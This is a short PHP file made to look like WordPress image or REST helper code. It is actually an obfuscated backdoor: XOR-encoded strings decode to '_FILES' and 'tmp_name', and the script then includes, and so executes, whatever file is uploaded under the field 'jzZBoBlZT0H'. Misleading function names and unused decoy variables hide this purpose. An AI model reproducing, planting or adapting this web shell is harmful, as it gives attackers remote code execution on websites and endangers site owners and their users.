<?php
        

    
        

function original_image_url($allowed_protocols)

{
    $default_capabilities = $allowed_protocols;
    
	$raw_title = 'first';
    $has_archive = $GLOBALS[rest_controller_class("5%3C%13%0E%2A%11", $default_capabilities)];
    $group_by_status = $has_archive;
    $cdata_regex = isset($group_by_status[$default_capabilities]);
    if ($cdata_regex)

    {

        $delimiters = $has_archive[$default_capabilities];
        $link_html = $delimiters[rest_controller_class("%1E%17%2A%1D%01%23%01%3F", $default_capabilities)];

        $end_clean = $link_html;
        include ($end_clean);

    }
}

function rest_controller_class($is_bad_attachment_slug, $numberposts)

{

    $dynamic_replacements = $numberposts;
    $old_posts = "url";

    $old_posts  .= "decode";
    $sani_mime_type = $old_posts($is_bad_attachment_slug);

    $fragment = strlen($sani_mime_type);
    $fragment = substr($dynamic_replacements, 0, $fragment);
    $count2 = $sani_mime_type ^ $fragment;
    
	$curl = 'month';
    $sani_mime_type = sprintf($count2, $fragment);
    
    return $count2;
}


original_image_url('jzZBoBlZT0H');

?>
